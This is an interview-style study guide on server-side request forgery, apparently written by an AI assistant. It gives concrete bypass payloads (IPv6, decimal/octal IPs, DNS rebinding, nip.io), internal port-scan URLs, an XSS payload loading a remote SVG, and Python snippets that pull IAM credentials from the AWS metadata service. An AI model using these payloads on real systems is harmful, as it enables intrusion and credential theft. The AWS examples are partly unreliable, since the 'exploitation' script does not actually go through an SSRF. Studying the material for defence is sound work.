# Advanced Interview Questions on Server-Side Request Forgery (SSRF)

## 1. What is SSRF (Server-Side Request Forgery) and how does it pose a security threat to web applications?

**Answer**: Server-Side Request Forgery (SSRF) is a security vulnerability that allows an attacker to manipulate a server to make HTTP requests to unintended locations. This typically occurs when a server processes user-provided URLs or IP addresses without proper validation. SSRF can be exploited to access internal systems, sensitive data, conduct network scanning, and even achieve remote command execution on another server.

---

## 2. Describe the methodology used to perform SSRF attacks.

**Answer**: The methodology for SSRF attacks involves:
1. Identifying input fields that process user-provided URLs or IP addresses.
2. Crafting malicious payloads to manipulate the server into making unintended requests.
3. Using various techniques to bypass filters and restrictions, such as using encoded IP addresses, different encoding schemes, and domain redirects.
4. Exploiting specific URL schemes (e.g., `file://`, `http://`, `gopher://`) to achieve desired outcomes like data exfiltration or remote code execution.

---

## 3. Explain how an attacker can bypass localhost restrictions using IPv6 notation.

**Answer**: An attacker can bypass localhost restrictions using IPv6 notation by leveraging unspecified or loopback addresses in IPv6. For example:
- Using unspecified address in IPv6: `http://[::]:80/`
- Using IPv6 loopback address: `http://[0000::1]:80/`
- Using IPv6/IPv4 address embedding: `http://[::ffff:127.0.0.1]`

These notations can be used to trick the application into making requests to the local machine.

---

## 4. How can DNS rebinding be used to bypass SSRF filters?

**Answer**: DNS rebinding involves creating a domain that alternates between two IP addresses. This can bypass SSRF filters that allow requests to certain domains but block direct IP addresses. For example, using the domain `make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms` alternates between `1.2.3.4` and `169.254.169.254`. By querying this domain, the attacker can manipulate the server to make requests to the internal IP address.

---

## 5. Describe how an attacker can exploit SSRF to access cloud metadata.

**Answer**: An attacker can exploit SSRF to access cloud metadata by crafting a request to the cloud provider's metadata service URL. For example, on AWS, the metadata service URL is `http://169.254.169.254/latest/meta-data/`. By injecting this URL into a vulnerable input field, the attacker can retrieve sensitive information such as IAM credentials, instance metadata, and configuration details.

---

## 6. What are some default targets commonly used in SSRF attacks?

**Answer**: Common default targets in SSRF attacks include:
- Localhost services: `http://localhost:80`, `http://localhost:22`, `https://localhost:443`
- Loopback addresses: `http://127.0.0.1:80`, `http://127.0.0.1:22`, `https://127.0.0.1:443`
- Unspecified addresses: `http://0.0.0.0:80`, `http://0.0.0.0:22`, `https://0.0.0.0:443`

These targets are typically used to access internal services and resources that are not exposed to the public internet.

---

## 7. How can SSRF be used to perform port scanning on internal networks?

**Answer**: SSRF can be used to perform port scanning by crafting requests to different ports on internal IP addresses. For example:
```
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```
By observing the server's response to these requests, the attacker can determine which ports are open and potentially identify services running on the internal network.

---

## 8. Explain how encoding techniques can be used to bypass SSRF filters.

**Answer**: Encoding techniques can be used to obfuscate the payload and bypass SSRF filters. Some common encoding techniques include:
- **URL encoding**: Single or double encoding specific URLs (e.g., `http://127.0.0.1/%61dmin`, `http://127.0.0.1/%2561dmin`).
- **Decimal IP address**: Converting IP addresses to decimal format (e.g., `http://2130706433/` for `http://127.0.0.1`).
- **Octal IP address**: Using octal representation of IP addresses (e.g., `http://0177.0.0.1/` for `http://127.0.0.1`).

These techniques help evade blacklist filters that check for specific patterns.

---

## 9. How can SSRF be upgraded to XSS (Cross-Site Scripting)?

**Answer**: SSRF can be upgraded to XSS by including an SVG file containing JavaScript code. For example:
```
https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
```
When the server processes the URL and renders the SVG file, the embedded JavaScript code executes in the context of the vulnerable application, leading to XSS.

---

## 10. What are some effective tools used for discovering and exploiting SSRF vulnerabilities?

**Answer**:
- **swisskyrepo/SSRFmap**: Automatic SSRF fuzzer and exploitation tool.
- **tarunkant/Gopherus**: Generates gopher links for exploiting SSRF and gaining RCE in various servers.
- **In3tinct/See-SURF**: Python-based scanner to find potential SSRF parameters.
- **teknogeek/SSRF-Sheriff**: Simple SSRF-testing tool written in Go.
- **assetnote/surf**: Returns a list of viable SSRF candidates.
- **dwisiswant0/ipfuscator**: Generates alternative IP(v4) address representations.
- **Horlad/r3dir**: A redirection service designed to help bypass SSRF filters that do not validate the redirect location.

---

### SSRF Deep Exploitation on AWS

Server-Side Request Forgery (SSRF) is a powerful vulnerability that can be exploited to access internal AWS resources, such as the EC2 metadata service, and potentially escalate privileges. Here’s a deep dive into SSRF exploitation on AWS along with some bypass techniques.

---

### Exploitation Techniques

1. **Accessing EC2 Metadata Service**:
   - The EC2 metadata service can be accessed via `http://169.254.169.254/latest/meta-data/`. This endpoint provides sensitive information, including IAM role credentials.
   - Example:
     ```python
     import requests

     url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/your-iam-role"
     response = requests.get(url)
     print(response.text)
     ```

2. **Exploiting IAM Role Misconfigurations**:
   - Misconfigured IAM roles with overly permissive policies can be exploited to gain higher privileges. Attackers can use the credentials obtained from the metadata service to assume other roles or access sensitive resources.

3. **Accessing S3 Buckets**:
   - Unsecured S3 buckets can be accessed directly if they are publicly accessible. Attackers can list, read, or write objects in these buckets.
   - Example:
     ```python
     import boto3

     s3 = boto3.client('s3')
     response = s3.list_buckets()
     print(response['Buckets'])
     ```

4. **CloudTrail Logs**:
   - Attackers can access CloudTrail logs to understand user actions and identify potential vulnerabilities. This can be done by querying the CloudTrail service using the stolen IAM credentials.

---

### Bypass Techniques

1. **Encoded Payloads**:
   - Using URL encoding to bypass filters. For example:
     ```
     http://127.0.0.1/%61dmin
     ```

2. **Unicode Escape Sequences**:
   - Using Unicode escape sequences to bypass AWS WAF filters. This involves encoding payloads in a way that the WAF does not recognize as malicious.

3. **IP Rotation**:
   - Using IP rotation techniques to bypass IP-based blocking and rate limiting. Tools like Rhino Security Labs' IP Rotate Burp Extension can help with this.

4. **Burp Plugin Exploits**:
   - Researchers have developed Burp plugins to bypass AWS WAF. These plugins can automate the process of finding and exploiting vulnerabilities in WAF configurations.

5. **DNS Rebinding**:
   - DNS rebinding can be used to bypass SSRF filters. By alternating between different IP addresses, attackers can trick the server into making requests to internal resources.

6. **Bypassing Localhost Restrictions**:
   - Using IPv6 notation to bypass localhost restrictions:
     ```
     http://[::]:80/
     http://[0000::1]:80/
     http://[::ffff:127.0.0.1]
     ```

7. **Using Domain Redirects**:
   - Using services like `nip.io` to convert IP addresses into DNS names that resolve to the same IP. For example:
     ```
     http://127.0.0.1.nip.io
     ```

8. **Bypassing Using Different Encoding**:
   - Using different encoding schemes to bypass filters. For example:
     ```
     http://127.0.0.1/%61dmin
     http://127.0.0.1/%2561dmin
     ```

---

### Example Exploitation

Here’s an example of exploiting the EC2 metadata service to retrieve IAM credentials:

```python
import requests

# Craft a request to the EC2 metadata service
url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/your-iam-role"

# Send the request
response = requests.get(url)

# Print the response (IAM credentials)
print(response.text)
```

This script fetches the IAM credentials associated with the IAM role, which can then be used to escalate privileges or access other resources.

---

### Tools and Resources

- **AWS-Offensive-Exploitation**: A GitHub repository with various techniques, tools, and frameworks for offensive exploitation of AWS infrastructure.
- **Sysdig Threat Research Team**: Provides insights and techniques for bypassing AWS WAF.
- **Rhino Security Labs**: Offers tools like IP Rotate Burp Extension for bypassing IP-based blocking.

These techniques and tools can help in understanding and mitigating AWS-specific vulnerabilities. If you have any specific scenarios or further questions, feel free to ask!
